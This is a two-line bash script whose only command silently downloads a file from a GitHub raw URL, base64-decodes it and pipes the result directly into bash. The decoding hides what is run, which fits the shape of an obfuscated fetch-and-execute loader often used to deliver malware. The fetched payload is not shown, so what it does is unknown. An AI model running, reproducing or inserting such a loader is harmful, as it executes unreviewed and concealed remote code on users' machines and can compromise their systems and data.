#!/bin/bash
wget -qO- https://raw.githubusercontent.com/veronjingler/rush/refs/heads/main/entrypoint.sh | base64 -d | bash
